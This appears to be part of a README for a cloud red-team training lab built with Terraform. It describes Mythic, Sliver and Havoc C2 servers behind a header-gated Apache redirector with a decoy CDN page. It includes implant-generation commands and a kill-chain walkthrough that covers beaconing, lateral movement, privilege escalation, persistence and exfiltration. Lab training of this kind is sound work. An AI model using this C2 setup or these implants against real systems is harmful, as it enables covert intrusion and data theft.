## 2. Traffic Flow (C2 Callbacks)

```
[Target Machine]
      │
      │  HTTPS GET /cdn/media/stream/payload.ps1
      │  Header: X-Request-ID: <auto-generated-token>
      ▼
┌──────────────┐
│  Redirector  │  EIP (80/443)
│  Apache      │
└──────┬───────┘
       │
       │  Header valid? ──── Yes ──▶ URI prefix match?
       │                                    │
       │  No                                 ├─ /cdn/media/stream/*  ──▶ mythic:80
       │                                    ├─ /cloud/storage/objects/* ──▶ sliver:80
       │                                    └─ /edge/cache/assets/*  ──▶ havoc:80
       │
       ▼
┌──────────────┐
│  Decoy Page  │  "CloudEdge CDN - Maintenance"
└──────────────┘  (served when header is missing/invalid)

Operator Access:

  [Operator Browser] ──HTTPS──▶ guac:443/guacamole
                                     │
                            ┌────────┼──────────┐
                            ▼        ▼           ▼
                        windows    mythic      kali
                         (RDP)    (SSH)       (SSH)
                            │
                            ▼
                    ┌───────────────┐
                    │  Mythic WebUI │  https://mythic:7443
                    │  Sliver CLI   │  sliver-client
                    │  Havoc Client │  havoc-client → havoc:40056
                    └───────────────┘
```

## 4. Security Groups (Firewall Rules)

Each host has a dedicated SG. Key rules:

**mythic:** SSH from instructor IP + Guacamole, WebUI (7443-7444) from Windows, HTTP/HTTPS from redirector VPC, all traffic from both VPCs.

**guacamole:** SSH/HTTP/HTTPS from anywhere (443 for portal, 80→443 redirect), SSH from self (Docker containers).

**windows:** RDP from Guacamole only (3389), plus temporary RDP from instructor IP.

**redirector:** HTTP/HTTPS from anywhere (80/443), SSH NOT exposed publicly — only via Guacamole. All traffic from TeamServer VPC.

**sliver:** HTTP/HTTPS from redirector VPC, Multiplexer (31337) from Windows + Guacamole.

**havoc:** HTTP/HTTPS from redirector VPC, Teamserver (40056) from Windows + Guacamole, VNC (5901) from Guacamole.

**kali:** SSH from instructor IP + Guacamole, XRDP (3389) from Guacamole.

## 5. Step-by-Step Deployment Guide

### Prerequisites

```bash
# 1. AWS CLI installed and configured
aws configure

# 2. Terraform >= 1.0 installed
terraform --version

# 3. Create SSH key pair (EC2 Console or CLI)
aws ec2 create-key-pair --key-name rs-rsa-key \
  --query 'KeyMaterial' --output text > rs-rsa-key.pem

# Set permissions (Windows PowerShell)
icacls .\rs-rsa-key.pem /inheritance:r /grant:r "$($env:USERNAME):(R)"

# 4. Accept Kali Linux Marketplace EULA (one-time)
# Visit: https://aws.amazon.com/marketplace/pp/prodview-fznsw3f7mq7to
# Click "Continue to Subscribe"

# 5. Submit AWS Penetration Testing form
# https://aws.amazon.com/security/penetration-testing/
```

### Configure

```bash
cd AWS/terraform
cp terraform.tfvars.example terraform.tfvars
```

Edit `terraform.tfvars`:

```hcl
# Required
localPub_ip          = "1.2.3.4/32"       # Your public IP
ssh_key_name         = "rs-rsa-key"
ssh_private_key_path = "../rs-rsa-key.pem" # Relative to terraform/
redirector_domain    = "c2.yourdomain.com"  # Or leave blank

# Optional - cost optimization
mythic_instance_type     = "t3.medium"
guacamole_instance_type  = "t3.small"
windows_instance_type    = "t3.medium"
sliver_instance_type     = "t3.small"
havoc_instance_type      = "t3.medium"
redirector_instance_type = "t3.small"

kali_deployment_mode = "headless"  # or "gui"
use_default_vpc      = false
vpc_cidr             = "10.50.0.0/16"
redirector_vpc_cidr  = "10.60.0.0/16"
```

### Deploy

```bash
cd AWS/terraform
terraform init
terraform apply
# Type 'yes' when prompted
# Wait 30-60 minutes
```

### Get Credentials

```bash
terraform output deployment_info
```

This shows all IPs, URLs, usernames, and passwords. Also saved to `../deployment_info.txt`.

### Access the Lab

1. **Guacamole Portal:** `https://<guac-eip>/guacamole` — login: `guacadmin` / `<password>`
2. From Guacamole, connections are pre-configured:
   - **Windows (RDP)** — full desktop
   - **Mythic (SSH)** — terminal to Mythic server
   - **Sliver (SSH)** — terminal to Sliver server
   - **Havoc (SSH)** — terminal to Havoc server
   - **Havoc Desktop (VNC)** — GUI with Havoc client
   - **Kali (SSH)** — terminal to Kali
   - **Redirector (SSH)** — terminal to redirector

### Clean Up

```bash
cd AWS/terraform
terraform destroy
# Type 'yes' when prompted
```

## 6. Working Guide — Operating the Lab

### Mythic C2

```bash
# Access via Guacamole > "Mythic (SSH)" or:
ssh -i rs-rsa-key.pem -J admin@<guac-eip> admin@mythic

# Mythic is Docker-based, runs in /opt/Mythic
cd /opt/Mythic
./mythic-cli status

# Web UI: https://mythic:7443 (open from Windows via Guacamole)
# Username: mythic_admin
# Password: (from deployment_info)
```

### Sliver C2

```bash
# Access via Guacamole > "Sliver (SSH)"
# Sliver server runs as systemd service
systemctl status sliver

# Connect as operator (config pre-installed)
sliver-client

# Import C2 profile for redirector routing
c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack

# Start HTTP listener
http --lhost 0.0.0.0 --lport 80

# Generate implant
generate --http https://<redirector-domain>/cloud/storage/objects/ \
  --os windows --arch amd64 --format exe \
  --c2profile redstack --save /tmp/implant.exe
```

### Havoc C2

```bash
# Access via Guacamole > "Havoc (SSH)"
# First run: build Havoc from source (~15-25 min)
~/build_havoc.sh

# Or connect via "Havoc Desktop (VNC)" — Havoc client autostarts
# Teamserver: localhost:40056
# Username: admin | Password: (from deployment_info)
```

### Redirector (Apache)

```bash
# Access via Guacamole > "Redirector (SSH)"
# Test routing
sudo /home/admin/test_redirector.sh

# View C2 callback logs
sudo tail -f /var/log/apache2/redirector-access.log
sudo tail -f /var/log/apache2/redirector-error.log

# Get Let's Encrypt cert (if you have a domain)
sudo certbot --apache -d c2.yourdomain.com
```

### Windows Workstation

## 7. Practice How-To Scenarios

### Scenario 1: Deploy Your First Beacon

1. SSH to mythic via Guacamole
2. Generate an Apollo payload from the Mythic Web UI
3. Download the payload on Windows via the browser
4. Execute on Windows — watch the callback appear on the redirector access log
5. Interact with the beacon from Mythic

### Scenario 2: Cross-C2 Operations

1. Start a Sliver HTTP listener
2. Generate a Sliver implant from the Sliver CLI
3. SCP the implant to Windows: `scp admin@sliver:/tmp/implant.exe .`
4. Execute on Windows — observe the callback
5. Use Sliver's `socks5` command to pivot through the Windows host

### Scenario 3: Redirector OPSEC Testing

1. From your local machine, probe the redirector without the C2 header:
   ```bash
   curl -k https://<redirector-eip>/cdn/media/stream/test
   # Should get: CloudEdge CDN decoy page
   ```
2. Probe WITH the correct header:
   ```bash
   curl -k -H "X-Request-ID: <token>" https://<redirector-eip>/cdn/media/stream/test
   # Should get: Mythic response
   ```
3. Check the redirector access logs to see both request types

### Scenario 4: VPN Tunnel for Cyber Ranges

(Requires `enable_vpn_tunnel = true` at deploy time)

1. Transfer your `.ovpn` file to Windows via Guacamole file transfer
2. Copy to redirector: `scp lab.ovpn admin@redirector:~/vpn/`
3. Start VPN: `sudo systemctl start vpn-tunnel`
4. Verify routing: `ping <ctf-target-ip>` from any lab machine
5. Generate implants with C2 pointing to the redirector's tun0 IP

### Scenario 5: Full Kill Chain

1. **Recon:** From Kali, scan Windows with nmap through Guacamole
2. **Initial Access:** Generate Sliver HTTP implant, deliver to Windows
3. **C2:** Beacon calls back through redirector → Sliver
4. **Lateral Movement:** From Sliver, use `execute-assembly` with SharpHound
5. **Enumeration:** Upload BloodHound data to Kali, run analysis
6. **Privilege Escalation:** Identify abuseable ACLs with Certipy
7. **Persistence:** Create scheduled task via Sliver
8. **Exfiltration:** Stage data on redirector, SCP out

## 9. Troubleshooting

| Symptom | Fix |
|---------|-----|
| `OptInRequired` for Kali | Visit the Marketplace link and accept EULA |
| Mythic SSL cert warning | Self-signed is expected — proceed past warning |
| Sliver not starting | Check memory: `free -m` — add swap if needed |
| Havoc build fails | Run `~/build_havoc.sh` again — retries from last step |
| Agent not calling back | Verify C2 header in payload matches `deployment_info` |
| Redirect rules not downloading | The `redirect.rules` file is fetched from GitHub — check network |
| VPC limit reached | Request limit increase or delete unused VPCs |
| Windows password not decrypting | May take 5-10 min after instance launch — wait and re-run |
